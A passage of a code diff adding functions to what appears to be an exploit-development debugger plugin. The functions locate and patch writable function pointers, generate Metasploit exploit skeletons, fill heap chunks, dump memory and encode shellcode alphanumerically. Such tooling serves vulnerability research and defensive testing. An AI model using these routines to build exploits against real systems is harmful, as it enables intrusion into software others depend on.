+																sizeval = struct.unpack('<H',dbg.readMemory(addyval-8,2))[0]
+																if sizeval >= chunksize:
+																	savetolog = True
+																	nr_sizematch += 1
+																	sizeinfo = " Chunksize: %d (0x%02x) - " % ((sizeval*8),(sizeval*8))																
+															else:
+																sizeval = struct.unpack('<H',dbg.readMemory(addyval-8-offset,2))[0]
+																#
+																flink = struct.unpack('<L',dbg.readMemory(addyval-offset,4))[0]
+																blink = struct.unpack('<L',dbg.readMemory(addyval+4-offset,4))[0]
+																aflink = getPointerAccess(flink)
+																ablink = getPointerAccess(blink)
+																if "READ" in aflink and "READ" in ablink:
+																	extr = ""
+																	if sizeval == chunksize or sizeval == chunksize + 1:
+																		extr = " **size match**"
+																		nr_sizematch += 1
+																	sizeinfo = " Chunksize: %d (0x%02x)%s, UserPtr 0x%08x, Flink 0x%08x, Blink 0x%08x - " % ((sizeval*8),(sizeval*8),extr,addyval-offset,flink,blink)
+																	savetolog = True
+														if savetolog:
+															fwptrs[loc] = addyval
+															tmodcnt += 1
+															ptrx = MnPointer(addyval)
+															mod = ptrx.belongsTo()
+
+															tofile = "0x%08x : 0x%08x gets called from %s at 0x%08x (%s) - %s%s" % (addyval,addyval,mod,loc,instrtext,sizeinfo,ptrx.__str__())
+															objwptr.write(tofile,wptrfile)
+															if setbps:
+																dbg.setBreakpoint(loc)
+															if dopatch:
+																dbg.writeLong(addyval,0x41414141)
+							if len(instrbytes) > 0:
+								loc = loc + len(instrbytes)/2
+							else:
+								loc = loc + 1
+						except:
+							loc = loc + 1
+					if not silent:
+						dbg.log("      Found %d pointers" % tmodcnt)
+						if chunksize > 0:
+							dbg.log("      %d pointers with size match" % nr_sizematch)								
+
+			return
+
+		def procGetxAT(args,mode):
+		
+			keywords = []
+			keywordstring = ""
+			modulecriteria = {}
+			criteria = {}
+
+			thisxat = {}
+
+			entriesfound = 0
+			
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					keywordstring = args["s"].replace("'","").replace('"','')
+					keywords = keywordstring.split(",")
+			
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			
+			modulestosearch = getModulesToQuery(modulecriteria)
+			if not silent:
+				dbg.log("[+] Querying %d modules" % len(modulestosearch))
+			
+			if len(modulestosearch) > 0:
+			
+				xatfilename="%ssearch.txt" % mode
+				objxatfilename = MnLog(xatfilename)
+				xatfile = objxatfilename.reset()
+			
+				for thismodule in modulestosearch:
+					thismod = MnModule(thismodule) 
+					if mode == "iat":
+						thisxat = thismod.getIAT()
+					else:
+						thisxat = thismod.getEAT()
+
+					thismodule = thismod.getShortName()
+
+					for thisfunc in thisxat:
+						thisfuncname = thisxat[thisfunc].lower()
+						origfuncname = thisfuncname
+						firstindex = thisfuncname.find(".")
+						if firstindex > 0:
+							thisfuncname = thisfuncname[firstindex+1:len(thisfuncname)]
+						addtolist = False
+						iatptr_modname = ""
+						modinfohr = ""
+						theptr = 0
+						if mode == "iat":
+							theptr = struct.unpack('<L',dbg.readMemory(thisfunc,4))[0]
+							ptrx = MnPointer(theptr)
+							iatptr_modname = ptrx.belongsTo()
+							if not iatptr_modname == "" and "." in iatptr_modname:
+								iatptr_modparts = iatptr_modname.split(".")
+								iatptr_modname = iatptr_modparts[0]
+							if not "." in origfuncname and iatptr_modname != "" and not "!" in origfuncname:
+								origfuncname = iatptr_modname.lower() + "." + origfuncname
+								thisfuncname = origfuncname
+								
+							if "!" in origfuncname:
+								oparts = origfuncname.split("!")
+								origfuncname = iatptr_modname + "." + oparts[1]
+								thisfuncname = origfuncname
+
+							try:
+								ModObj = MnModule(iatptr_modname)
+								modinfohr = " - %s" % (ModObj.__str__())
+							except:
+								modinfohr = ""
+								pass
+
+						if len(keywords) > 0:
+							for keyword in keywords:
+								keyword = keyword.lower().strip()
+								if ((keyword.startswith("*") and keyword.endswith("*")) or keyword.find("*") < 0):
+									keyword = keyword.replace("*","")
+									if thisfuncname.find(keyword) > -1:
+										addtolist = True
+										break
+								if keyword.startswith("*") and not keyword.endswith("*"):
+									keyword = keyword.replace("*","")
+									if thisfuncname.endswith(keyword):
+										addtolist = True
+										break
+								if keyword.endswith("*") and not keyword.startswith("*"):
+									keyword = keyword.replace("*","")
+									if thisfuncname.startswith(keyword):
+										addtolist = True
+										break
+						else:
+							addtolist = True
+						if addtolist:
+							entriesfound += 1
+							# add info about the module
+
+							if mode == "iat":
+								thedelta = thisfunc - thismod.moduleBase
+								logentry = "At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s) %s" % (toHex(thisfunc),thismodule.lower(),toHex(thedelta),toHex(theptr),origfuncname,modinfohr)
+							else:
+								thedelta = thisfunc - thismod.moduleBase
+								logentry = "0x%08x : %s!%s (0x%08x+0x%08x)" % (thisfunc,thismodule.lower(),origfuncname,thismod.moduleBase,thedelta)
+							dbg.log(logentry,address = thisfunc)
+							objxatfilename.write(logentry,xatfile)
+				if not silent:
+					dbg.log("")
+					dbg.log("%d entries found" % entriesfound)
+			return
+
+			
+		#-----Metasploit module skeleton-----#
+		def procSkeleton(args):
+		
+			cyclicsize = 5000
+			if "c" in args:
+				if type(args["c"]).__name__.lower() != "bool":
+					try:
+						cyclicsize = int(args["c"])
+					except:
+						cyclicsize = 5000
+
+			exploittype = ""
+			skeletonarg = ""
+			usecliargs = False
+			validstypes ={}
+			validstypes["tcpclient"] = "network client (tcp)"
+			validstypes["udpclient"] = "network client (udp)"
+			validstypes["fileformat"] = "fileformat"
+			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
+			errorfound = False
+			if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
+				if "t" in args:
+					if type(args["t"]).__name__.lower() != "bool":
+						skeltype = args["t"].lower()
+						skelparts = skeltype.split(":")
+						if skelparts[0] in validstypes:
+							exploittype = validstypes[skelparts[0]]
+							if len(skelparts) > 1:
+								skeletonarg = skelparts[1]
+							else:
+								errorfound = True
+							usecliargs = True
+						else:
+							errorfound = True
+					else:
+						errorfound = True
+				else:
+					errorfound = True
+			# ask for type of module
+			else:
+				dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
+				exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
+
+			if errorfound:
+				dbg.log(" ** Please specify a valid skeleton type and argument **",highlight=1)
+				dbg.log("    Valid types are : tcpclient:argument, udpclient:argument, fileformat:argument")
+				dbg.log("    Example : skeleton for a pdf file format exploit: -t fileformat:pdf")
+				dbg.log("              skeleton for tcp client against port 123: -t tcpclient:123")
+				return
+			if not exploittype in exploittypes:
+				dbg.log("Boo - invalid exploit type, try again !",highlight=1)
+				return
+				
+			portnr = 0
+			extension = ""
+			if exploittype.find("network") > -1:
+				if usecliargs:
+					portnr = skeletonarg
+				else:
+					portnr = dbg.inputBox("Remote port number : ")
+				try:
+					portnr = int(portnr)
+				except:
+					portnr = 0
+
+			if exploittype.find("fileformat") > -1:
+				if usecliargs:
+					extension = skeletonarg
+				else:
+					extension = dbg.inputBox("File extension :")
+			
+			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
+			
+			if not extension.startswith("."):
+				extension = "." + extension			
+			
+			exploitfilename="msfskeleton.rb"
+			objexploitfile = MnLog(exploitfilename)
+			global ignoremodules
+			global noheader
+			noheader = True
+			ignoremodules = True
+			exploitfile = objexploitfile.reset()			
+			ignoremodules = False
+			noheader = False
+
+			modulecriteria = {}
+			criteria = {}
+			
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			
+			badchars = ""
+			if "badchars" in criteria:
+				badchars = criteria["badchars"]
+				
+			if "nonull" in criteria:
+				if not '\x00' in badchars:
+					badchars += '\x00'			
+			
+			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,"",badchars)
+			
+			targetstr = "      'Targets'    =>\n"
+			targetstr += "        [\n"
+			targetstr += "          [ '<fill in the OS/app version here>',\n"
+			targetstr += "            {\n"
+			targetstr += "              'Ret'     =>  0x00000000,\n"
+			targetstr += "              'Offset'  =>  0\n"
+			targetstr += "            }\n"
+			targetstr += "          ],\n"
+			targetstr += "        ],\n"
+			
+			exploitstr = "  def exploit\n\n"
+			if exploittype.find("network") > -1:
+				if exploittype.find("tcp") > -1:
+					exploitstr += "\n    connect\n\n"
+				elif exploittype.find("udp") > -1:
+					exploitstr += "\n    connect_udp\n\n"
+			
+			exploitstr += "    buffer = Rex::Text.pattern_create(" + str(cyclicsize) + ")\n"
+			
+			if exploittype.find("network") > -1:
+				exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"	
+				if exploittype.find("tcp") > -1:
+					exploitstr += "    sock.put(buffer)\n"
+					exploitstr += "\n    handler\n"
+				elif exploittype.find("udp") > -1:
+					exploitstr += "    udp_sock.put(buffer)\n"
+					exploitstr += "\n    handler(udp_sock)\n"			
+			if exploittype == "fileformat":
+				exploitstr += "\n    file_create(buffer)\n\n"						
+			if exploittype.find("network") > -1:
+				exploitstr += "    disconnect\n\n"						
+				
+			exploitstr += "  end\n"				
+			
+			objexploitfile.write(skeletonheader+"\n",exploitfile)
+			objexploitfile.write(skeletoninit+"\n",exploitfile)
+			objexploitfile.write(targetstr,exploitfile)
+			objexploitfile.write(skeletoninit2,exploitfile)		
+			objexploitfile.write(exploitstr,exploitfile)
+			objexploitfile.write("end",exploitfile)	
+			
+			
+			return
+
+
+		def procFillChunk(args):
+		
+			reference = ""
+			fillchar = "A"
+			allregs = dbg.getRegs()
+			origreference = ""
+
+			deref = False
+			refreg = ""
+			offset = 0
+			signstuff = 1
+			customsize = 0
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					sizearg = args["s"]
+					if sizearg.lower().startswith("0x"):
+						sizearg = sizearg.lower().replace("0x","")
+						customsize = int(sizearg,16)
+					else:
+						customsize = int(sizearg)
+
+			if "r" in args:
+				if type(args["r"]).__name__.lower() != "bool":
+
+					# break into pieces
+					reference = args["r"].upper()
+					origreference = reference
+					if reference.find("[") > -1 and reference.find("]") > -1:
+						refregtmp = reference.replace("[","").replace("]","").replace(" ","")
+						if reference.find("+") > -1 or reference.find("-") > -1:
+							# deref with offset
+							refregtmpparts = []
+							if reference.find("+") > -1:
+								refregtmpparts = refregtmp.split("+")
+								signstuff = 1
+							if reference.find("-") > -1:
+								refregtmpparts = refregtmp.split("-")
+								signstuff = -1
+							if len(refregtmpparts) > 1:
+								offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
+								deref = True
+								refreg = refregtmpparts[0]
+								if not refreg in allregs:
+									dbg.log("** Please provide a valid reference using -r reg/reference **")
+									return
+							else:
+								dbg.log("** Please provide a valid reference using -r reg/reference **")
+								return																
+						else:
+							# only deref
+							refreg = refregtmp
+							deref = True
+					else:
+						# no deref, maybe offset
+						if reference.find("+") > -1 or reference.find("-") > -1:
+							# deref with offset
+							refregtmpparts = []
+							refregtmp = reference.replace(" ","")
+							if reference.find("+") > -1:
+								refregtmpparts = refregtmp.split("+")
+								signstuff = 1
+							if reference.find("-") > -1:
+								refregtmpparts = refregtmp.split("-")
+								signstuff = -1
+							if len(refregtmpparts) > 1:
+								offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
+								refreg = refregtmpparts[0]
+								if not refreg in allregs:
+									dbg.log("** Please provide a valid reference using -r reg/reference **")
+									return
+							else:
+								dbg.log("** Please provide a valid reference using -r reg/reference **")
+								return																
+						else:
+							# only deref
+							refregtmp = reference.replace(" ","")
+							refreg = refregtmp
+							deref = False
+				else:
+					dbg.log("** Please provide a valid reference using -r reg/reference **")
+					return
+			else:
+				dbg.log("** Please provide a valid reference using -r reg/reference **")
+				return
+
+			if not refreg in allregs:
+				dbg.log("** Please provide a valid reference using -r reg/reference **")
+				return				
+
+			dbg.log("Ref : %s" % refreg)
+			dbg.log("Offset : %d (0x%s)" % (offset,toHex(int(str(offset).replace("-","")))))
+			dbg.log("Deref ? : %s" % deref)
+
+			if "b" in args:
+				if type(args["b"]).__name__.lower() != "bool":
+					if args["b"].find("\\x") > -1:
+						fillchar = hex2bin(args["b"])[0]
+					else:
+						fillchar = args["b"][0]
+
+			# see if we can read the reference
+			refvalue = 0
+			if deref:
+				refref = 0
+				try:
+					refref = allregs[refreg]+offset
+				except:
+					dbg.log("** Unable to read from %s (0x%08x)" % (origreference,allregs[refreg]+offset))
+				try:
+					refvalue = struct.unpack('<L',dbg.readMemory(refref,4))[0]
+				except:
+					dbg.log("** Unable to read from %s (0x%08x) -> 0x%08x" % (origreference,allregs[reference]+offset,refref))
+					return
+			else:
+				try:
+					refvalue = allregs[refreg]+offset
+				except:
+					dbg.log("** Unable to read from %s (0x%08x)" % (reference,allregs[refreg]+offset))
+
+			dbg.log("Reference : %s: 0x%08x" % (origreference,refvalue))
+			dbg.log("Fill char : \\x%s" % bin2hex(fillchar))
+
+			cmd2run = "!heap -p -a 0x%08x" % refvalue
+			output = dbg.nativeCommand(cmd2run)
+			outputlines = output.split("\n")
+			heapinfo = ""
+			for line in outputlines:
+				if line.find("[") > -1 and line.find("]") > -1 and line.find("(") > -1 and line.find(")") > -1:
+					heapinfo = line
+					break
+			if heapinfo == "":
+				dbg.log("Address is not part of a heap chunk")
+				if customsize > 0:
+					dbg.log("Filling memory location starting at 0x%08x with \\x%s" % (refvalue,bin2hex(fillchar)))
+					dbg.log("Number of bytes to write : %d (0x%08x)" % (customsize,customsize))
+					data = fillchar * customsize
+					dbg.writeMemory(refvalue,data)
+					dbg.log("Done")
+				else:
+					dbg.log("Please specify a custom size with -s to fill up the memory location anyway")
+			else:
+				infofields = []
+				cnt = 0
+				charseen = False
+				thisfield = ""
+				while cnt < len(heapinfo):
+					if heapinfo[cnt] == " " and charseen and thisfield != "":
+						infofields.append(thisfield)
+						thisfield = ""
+					else:
+						if not heapinfo[cnt] == " ":
+							thisfield += heapinfo[cnt]
+							charseen = True
+					cnt += 1
+				if thisfield != "":
+					infofields.append(thisfield)
+				if len(infofields) > 7:
+					chunkptr = hexStrToInt(infofields[0]) 
+					userptr = hexStrToInt(infofields[4])
+					size = hexStrToInt(infofields[5])
+					dbg.log("Heap chunk found at 0x%08x, size 0x%08x (%d) bytes" % (chunkptr,size,size))
+					dbg.log("Filling chunk with \\x%s, starting at 0x%08x" % (bin2hex(fillchar),userptr))
+					data = fillchar * size
+					dbg.writeMemory(userptr,data)
+					dbg.log("Done")
+			return
+
+		def procInfoDump(args):
+			allpages = dbg.getMemoryPages()
+			filename = "infodump.xml"
+			xmldata = '<info>\n'
+			xmldata += "<modules>\n"
+			if len(g_modules) == 0:
+				populateModuleInfo()
+			modulestoquery=[]
+			for thismodule,modproperties in g_modules.iteritems():
+				xmldata += "  <module name='%s'>\n" % thismodule
+				thisbase = getModuleProperty(thismodule,"base")
+				thissize = getModuleProperty(thismodule,"size")
+				xmldata += "    <base>0x%08x</base>\n" % thisbase
+				xmldata += "    <size>0x%08x</size>\n" % thissize
+				xmldata += "  </module>\n"
+			xmldata += "</modules>\n"
+			orderedpages = []
+			for tpage in allpages.keys():
+				orderedpages.append(tpage)
+			orderedpages.sort()
+			if len(orderedpages) > 0:
+				xmldata += "<pages>\n"				
+				# first dump module info to file
+				objfile = MnLog(filename)
+				infofile = objfile.reset(clear=True,showheader=False)
+				f = open(infofile,"wb")
+				for line in xmldata.split("\n"):
+					if line != "":
+						f.write(line + "\n")
+				tolog = "Dumping the following pages to file:"
+				dbg.log(tolog)
+				tolog = "Start        End        Size         ACL"
+				dbg.log(tolog)
+				for thispage in orderedpages:
+					page = allpages[thispage]
+					pagestart = page.getBaseAddress()
+					pagesize = page.getSize()
+					ptr = MnPointer(pagestart)
+					mod = ""
+					sectionname = ""
+					ismod = False
+					isstack = False
+					isheap = False
+					try:
+						mod = ptr.belongsTo()
+						if mod != "":
+							ismod = True
+					except:
+						mod = ""
+					if not ismod:
+						if ptr.isOnStack():
+							isstack = True
+					if not ismod and not isstack:
+						if ptr.isInHeap():
+							isheap = True
+					if not ismod and not isstack and not isheap:
+						acl = page.getAccess(human=True)
+						if not "NOACCESS" in acl:
+							tolog = "0x%08x - 0x%08x (0x%08x) %s" % (pagestart,pagestart + pagesize,pagesize,acl)
+							dbg.log(tolog)
+							# add page contents to xml
+							thispage = dbg.readMemory(pagestart,pagesize)
+							f.write("  <page start=\"0x%08x\">\n" % pagestart)
+							f.write("    <size>0x%08x</size>\n" % pagesize)
+							f.write("    <acl>%s</acl>\n" % acl)
+							f.write("    <contents>")
+							memcontents = ""
+							for thisbyte in thispage:
+								memcontents += bin2hex(thisbyte)
+							f.write(memcontents)
+							f.write("</contents>\n")
+							f.write("  </page>\n")
+				f.write("</pages>\n")
+				f.write("</info>")
+				dbg.log("")
+				f.close()
+				dbg.log("Done")
+			return
+
+		
+		def procPEB(args):
+			"""
+			Show the address of the PEB
+			"""
+			pebaddy = dbg.getPEBAddress()
+			dbg.log("PEB is located at 0x%08x" % pebaddy,address=pebaddy)
+			return
+
+		def procTEB(args):
+			"""
+			Show the address of the TEB for the current thread
+			"""
+			tebaddy = dbg.getCurrentTEBAddress()
+			dbg.log("TEB is located at 0x%08x" % tebaddy,address=tebaddy)
+			return
+
+		def procPageACL(args):
+			global silent
+			silent = True
+			findaddy = 0
+			if "a" in args:
+				findaddy,addyok = getAddyArg(args["a"])
+				if not addyok:
+					dbg.log("%s is an invalid address" % args["a"], highlight=1)
+					return
+			if findaddy > 0:
+				dbg.log("Displaying page information around address 0x%08x" % findaddy)
+			allpages = dbg.getMemoryPages()
+			dbg.log("Total of %d pages : "% len(allpages))
+			filename="pageacl.txt"
+			orderedpages = []
+			for tpage in allpages.keys():
+				orderedpages.append(tpage)
+			orderedpages.sort()
+			# find indexes to show in case we have specified an address
+			toshow = []
+			previouspage = 0
+			nextpage = 0
+			pagefound = False
+			if findaddy > 0:
+				for thispage in orderedpages:
+					page = allpages[thispage]
+					pagestart = page.getBaseAddress()
+					pagesize = page.getSize()
+					pageend = pagestart + pagesize
+					if findaddy >= pagestart and findaddy < pageend:
+						toshow.append(thispage)
+						pagefound = True
+					if pagefound and previouspage > 0:
+						if not previouspage in toshow:
+							toshow.append(previouspage)
+						if not thispage in toshow:
+							toshow.append(thispage) # nextpage
+						break
+					previouspage = thispage
+			if len(toshow) > 0:
+				toshow.sort()
+				orderedpages = toshow
+				dbg.log("Showing %d pages" % len(orderedpages))
+			if len(orderedpages) > 0:
+				objfile = MnLog(filename)
+				aclfile = objfile.reset()
+				tolog = "Start        End        Size         ACL"
+				dbg.log(tolog)
+				objfile.write(tolog,aclfile)
+				for thispage in orderedpages:
+					page = allpages[thispage]
+					pagestart = page.getBaseAddress()
+					pagesize = page.getSize()
+					ptr = MnPointer(pagestart)
+					mod = ""
+					sectionname = ""
+					try:
+						mod = ptr.belongsTo()
+						if not mod == "":
+							mod = "(" + mod + ")"
+							sectionname = page.getSection()
+					except:
+						#print traceback.format_exc()
+						pass
+					if mod == "":
+						if ptr.isOnStack():
+							mod = "(Stack)"
+						elif ptr.isInHeap():
+							mod = "(Heap)"
+					acl = page.getAccess(human=True)
+					tolog = "0x%08x - 0x%08x (0x%08x) %s %s %s" % (pagestart,pagestart + pagesize,pagesize,acl,mod, sectionname)
+					objfile.write(tolog,aclfile)
+					dbg.log(tolog)
+			silent = False
+			return
+
+		def procMacro(args):
+			validcommands = ["run","set","list","del","add","show"]
+			validcommandfound = False
+			selectedcommand = ""
+			for command in validcommands:
+				if command in args:
+					validcommandfound = True
+					selectedcommand = command
+					break
+			dbg.log("")
+			if not validcommandfound:
+				dbg.log("*** Please specify a valid command. Valid commands are :")
+				for command in validcommands:
+					dbg.log("    -%s" % command)
+				return			
+
+			macroname = ""
+			if "set" in args:
+				if type(args["set"]).__name__.lower() != "bool":
+					macroname = args["set"]
+
+			if "show" in args:
+				if type(args["show"]).__name__.lower() != "bool":
+					macroname = args["show"]
+
+			if "add" in args:
+				if type(args["add"]).__name__.lower() != "bool":
+					macroname = args["add"]				
+
+			if "del" in args:
+				if type(args["del"]).__name__.lower() != "bool":
+					macroname = args["del"]	
+
+			if "run" in args:
+				if type(args["run"]).__name__.lower() != "bool":
+					macroname = args["run"]	
+
+			filename = ""
+			index = -1
+			insert = False
+			iamsure = False
+			if "index" in args:
+				if type(args["index"]).__name__.lower() != "bool":
+					index = int(args["index"])
+					if index < 0:
+						dbg.log("** Please use a positive integer as index",highlight=1)
+
+			if "file" in args:
+				if type(args["file"]).__name__.lower() != "bool":
+					filename = args["file"]
+
+			if filename != "" and index > -1:
+				dbg.log("** Please either provide an index or a filename, not both",highlight=1)
+				return
+
+			if "insert" in args:
+				insert = True
+
+			if "iamsure" in args:
+				iamsure = True
+
+			argcommand = ""
+			if "cmd" in args:
+				if type(args["cmd"]).__name__.lower() != "bool":
+					argcommand = args["cmd"]
+
+
+			dbg.setKBDB("monamacro.db")
+			macros = dbg.getKnowledge("macro")
+			if macros is None:
+				macros = {}
+
+			if selectedcommand == "list":
+				for macro in macros:
+					thismacro = macros[macro]
+					macronametxt = "Macro : '%s' : %d command(s)" % (macro,len(thismacro))
+					dbg.log(macronametxt)
+				dbg.log("")
+				dbg.log("Number of macros : %d" % len(macros))
+
+			if selectedcommand == "show":
+				if macroname != "":
+					if not macroname in macros:
+						dbg.log("** Macro %s does not exist !" % macroname)
+						return
+					else:
+						macro = macros[macroname]
+						macronametxt = "Macro : %s" % macroname
+						macroline = "-" * len(macronametxt)
+						dbg.log(macronametxt)
+						dbg.log(macroline)
+						thismacro = macro
+						macrolist = []
+						for macroid in thismacro:
+							macrolist.append(macroid)
+						macrolist.sort()
+						nr_of_commands = 0
+						for macroid in macrolist:
+							macrocmd = thismacro[macroid]
+							if macrocmd.startswith("#"):
+								dbg.log("   [%04d] File:%s" % (macroid,macrocmd[1:]))
+							else:
+								dbg.log("   [%04d] %s" % (macroid,macrocmd))
+							nr_of_commands += 1
+						dbg.log("")
+						dbg.log("Nr of commands in this macro : %d" % nr_of_commands)
+				else:
+					dbg.log("** Please specify the macroname to show !",highlight=1)
+					return					
+
+			if selectedcommand == "run":
+				if macroname != "":
+					if not macroname in macros:
+						dbg.log("** Macro %s does not exist !" % macroname)
+						return
+					else:
+						macro = macros[macroname]
+						macronametxt = "Running macro : %s" % macroname
+						macroline = "-" * len(macronametxt)
+						dbg.log(macronametxt)
+						dbg.log(macroline)
+						thismacro = macro
+						macrolist = []
+						for macroid in thismacro:
+							macrolist.append(macroid)
+						macrolist.sort()
+						for macroid in macrolist:
+							macrocmd = thismacro[macroid]
+							if macrocmd.startswith("#"):
+								dbg.log("Executing script %s" % macrocmd[1:])
+								output = dbg.nativeCommand("$<%s" % macrocmd[1:])
+								dbg.logLines(output)
+								dbg.log("-" * 40)
+							else:
+								dbg.log("Index %d : %s" % (macroid,macrocmd))
+								dbg.log("")
+								output = dbg.nativeCommand(macrocmd)
+								dbg.logLines(output)
+								dbg.log("-" * 40)
+						dbg.log("")
+						dbg.log("[+] Done.")
+				else:
+					dbg.log("** Please specify the macroname to run !",highlight=1)
+					return	
+
+			if selectedcommand == "set":
+				if macroname != "":
+					if not macroname in macros:
+						dbg.log("** Macro %s does not exist !" % macroname)
+						return
+					if argcommand == "" and filename == "":
+						dbg.log("** Please enter a valid command with parameter -cmd",highlight=1)
+						return
+					thismacro = macros[macroname]
+					if index == -1:
+						for i in thismacro:
+							thiscmd = thismacro[i]
+							if thiscmd.startswith("#"):
+								dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
+								dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
+								return						
+						if filename == "":
+							# append to end of the list
+							# find the next index first
+							nextindex = 0
+							for macindex in thismacro:
+								if macindex >= nextindex:
+									nextindex = macindex+1
+							if thismacro.__class__.__name__ == "dict":
+								thismacro[nextindex] = argcommand
+							else:
+								thismacro = {}
+								thismacro[nextindex] = argcommand
+						else:
+							thismacro = {}
+							nextindex = 0
+							thismacro[0] = "#%s" % filename
+						macros[macroname] = thismacro
+						dbg.addKnowledge("macro",macros)
+						dbg.log("[+] Done, saved new command at index %d." % nextindex)
+					else:
+						# user has specified an index
+						if index in thismacro:
+							if argcommand == "#":
+								# remove command at this index
+								del thismacro[index]
+							else:
+								# if macro already contains a file entry, bail out
+								for i in thismacro:
+									thiscmd = thismacro[i]
+									if thiscmd.startswith("#"):
+										dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
+										dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
+										return
+								# index exists - overwrite unless -insert was provided too
+								# remove or insert ?
+								#print sys.argv
+								if not insert:
+									thismacro[index] = argcommand
+								else:
+									# move things around
+									# get ordered list of existing indexes
+									indexes = []
+									for macindex in thismacro:
+										indexes.append(macindex)
+									indexes.sort()
+									thismacro2 = {}
+									cmdadded = False
+									for i in indexes:
+										if i < index:
+											thismacro2[i] = thismacro[i]
+										elif i == index:
+											thismacro2[i] = argcommand
+											thismacro2[i+1] = thismacro[i]
+										elif i > index:
+											thismacro2[i+1] = thismacro[i]
+									thismacro = thismacro2
+						else:
+							# index does not exist, add new command to this index
+							for i in thismacro:
+								thiscmd = thismacro[i]
+								if thiscmd.startswith("#"):
+									dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
+									dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
+									return							
+							if argcommand != "#":
+								thismacro[index] = argcommand
+							else:
+								dbg.log("** Index %d does not exist, unable to remove the command at that position" % index,highlight=1)
+						macros[macroname] = thismacro
+						dbg.addKnowledge("macro",macros)
+						if argcommand != "#":
+							dbg.log("[+] Done, saved new command at index %d." % index)
+						else:
+							dbg.log("[+] Done, removed command at index %d." % index)
+				else:
+					dbg.log("** Please specify the macroname to edit !",highlight=1)
+					return
+
+			if selectedcommand == "add":
+				if macroname != "":
+					if macroname in macros:
+						dbg.log("** Macro '%s' already exists !" % macroname,highlight=1)
+						return
+					else:
+						macros[macroname] = {}
+						dbg.log("[+] Adding macro '%s'" % macroname)
+						dbg.addKnowledge("macro",macros)
+						dbg.log("[+] Done.")
+				else:
+					dbg.log("** Please specify the macroname to add !",highlight=1)
+					return
+
+
+			if selectedcommand == "del":
+				if not macroname in macros:
+					dbg.log("** Macro '%s' doesn't exist !" % macroname,highlight=1)
+				else:
+					if not iamsure:
+						dbg.log("** To delete macro '%s', please add the -iamsure flag to the command" % macroname)
+						return
+					else:
+						dbg.forgetKnowledge("macro",macroname)
+						dbg.log("[+] Done, deleted macro '%s'" % macroname)
+			return
+
+
+		def procEnc(args):
+			validencoders = ['alphanum']
+			encodertyperror = True
+			byteerror = True
+			encodertype = ""
+			bytestoencodestr = ""
+			bytestoencode = ""
+			badbytes = ""
+			
+			if "t" in args:
+				if type(args["t"]).__name__.lower() != "bool":
+					encodertype = args["t"]
+					encodertyperror = False
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					bytestoencodestr = args["s"]
+					byteerror = False
+
+			if "f" in args:
+				if type(args["f"]).__name__.lower() != "bool":
+					binfile = getAbsolutePath(args["f"])
+					if os.path.exists(binfile):
+						if not silent:
+							dbg.log("[+] Reading bytes from %s" % binfile)
+						try:
+							f = open(binfile,"rb")
+							content = f.readlines()
+							f.close()
+							for c in content:
+								for a in c:
+									bytestoencodestr += "\\x%02x" % ord(a)
+							byteerror = False
+						except:
+							dbg.log("*** Error - unable to read bytes from %s" % binfile)
+							dbg.logLines(traceback.format_exc(),highlight=True)
+							byteerror = True
+					else:
+						byteerror = True
+				else:
+					byteerror = True
+
+			if "cpb" in args:
+				if type(args["cpb"]).__name__.lower() != "bool":
+					badbytes = hex2bin(args["cpb"])
+
+			if not encodertype in validencoders:
+				encodertyperror = True
+
+			if bytestoencodestr == "":
+				byteerror = True
+			else:
+				bytestoencode = hex2bin(bytestoencodestr)
+
+			if encodertyperror:
+				dbg.log("*** Please specific a valid encodertype with parameter -t.",highlight=True)
+				dbg.log("*** Valid types are: %s" % validencoders,highlight=True)
+
+
+			if byteerror:
+				dbg.log("*** Please specify a valid series of bytes with parameter -s",highlight=True)
+				dbg.log("*** or specify a valid path with parameter -f",highlight=True)
+
+			if encodertyperror or byteerror:
+				return
+			else:
+				cEncoder = MnEncoder(bytestoencode)
+				encodedbytes = ""
+				if encodertype == "alphanum":
+					encodedbytes = cEncoder.encodeAlphaNum(badchars = badbytes)
+					# determine correct sequence of dictionary
+					if len(encodedbytes) > 0:
+						logfile = MnLog("encoded_%s.txt" % encodertype)
+						thislog = logfile.reset()
+						if not silent:
+							dbg.log("")
+							dbg.log("Results:")
+							dbg.log("--------")
+						logfile.write("",thislog)
+						logfile.write("Results:",thislog)
+						logfile.write("--------",thislog)
+						encodedindex = []
+						fulllist_str = ""
+						fulllist_bin = ""
+						for i in encodedbytes:
+							encodedindex.append(i)
+						for i in encodedindex:
+							thisline = encodedbytes[i]
+							# 0 = bytes
+							# 1 = info
+							thislinebytes = "\\x" +  "\\x".join(bin2hex(a) for a in thisline[0])
+							logline = "  %s : %s : %s" % (thisline[0],thislinebytes,thisline[1])
+							if not silent:
+								dbg.log("%s" % logline)
+							logfile.write(logline,thislog)
+							fulllist_str += thislinebytes
+							fulllist_bin += thisline[0]
+
+						if not silent:
+							dbg.log("")
+							dbg.log("Full encoded string:")
+							dbg.log("--------------------")
+							dbg.log("%s" % fulllist_bin)
+						logfile.write("",thislog)
+						logfile.write("Full encoded string:",thislog)
+						logfile.write("--------------------",thislog)
+						logfile.write("%s" % fulllist_bin,thislog)
+						logfile.write("",thislog)
+						logfile.write("Full encoded hex:",thislog)
+						logfile.write("-----------------",thislog)
+						logfile.write("%s" % fulllist_str,thislog)
+			return
+
+		def procString(args):
+			mode = ""
+			useunicode = False
+			terminatestring = True
+			addy = 0
